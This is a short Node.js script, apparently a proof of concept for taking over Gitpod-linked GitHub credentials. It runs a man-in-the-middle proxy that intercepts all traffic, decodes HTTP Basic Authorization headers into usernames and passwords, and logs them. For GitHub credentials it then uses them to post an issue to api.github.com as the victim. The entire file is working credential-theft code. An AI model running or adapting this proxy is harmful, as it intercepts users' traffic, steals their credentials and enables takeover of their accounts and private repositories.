const stream = require('stream')
,     MitmProxy = require('@pureproxy/mitmproxy')

var credentials = {}

const storeCredentials = data => new Promise((resolve, reject) => {
    if (!credentials[data.target]) {

        credentials[data.target] = data
        
        console.log('I got a new credential:', data)

        if (data.target == 'github.com') {
            require('request').post({
                headers: { 'content-type' : 'application/json',
                            'user-agent': 'request' },
                url: `https://${encodeURI(data.user)}:${encodeURI(data.password)}@api.github.com/repos/gerardo-junior/gitpod-provider-credentials-takeover/issues`,
                body: JSON.stringify({ 
                    title: 'I got a valid token from you!',
                    body: 'this is a return to click on open on gitpod button, i got a valid token with the power to manage private repositories from you!',
                    assignee: 'gerardo-junior' 
                })
            })
        }
    }
})

const server = new class extends MitmProxy {
  wrapClientForObservableStreaming(client, { hostname, port, context }) {
    // return a duplex stream (like sockets) to monitor all data in transit
 
    return new class extends stream.Duplex {
      constructor() {
        super()
 
        client.on('data', (data) => {
          // log incoming data
          this.push(data)
        })
      }
 
      _write(data, encoding, callback) {
        // log outgoing data
        let payload = data.toString('utf8')
        
        payload.split('\n').forEach(content => {
            if (content.startsWith('Authorization')) {
                try {
                 
                    let basicAuth =  Buffer.from(content.replace('Authorization: Basic ', ''), 'base64').toString('utf8').split(':')

                    storeCredentials({
                        target: client._host || client._parent._host,
                        user: decodeURI(basicAuth[0]), 
                        password: decodeURI(basicAuth[1]) 
                    })        

                } catch (err) {
                    console.error(err)
                }
            }
        })

        client.write(data)
 
        callback()
      }
 
      _read() {}
    }
  }
 
  shouldIntercept(hostname, port, context) {
    return true
  }
}
 
server.listen(8080)
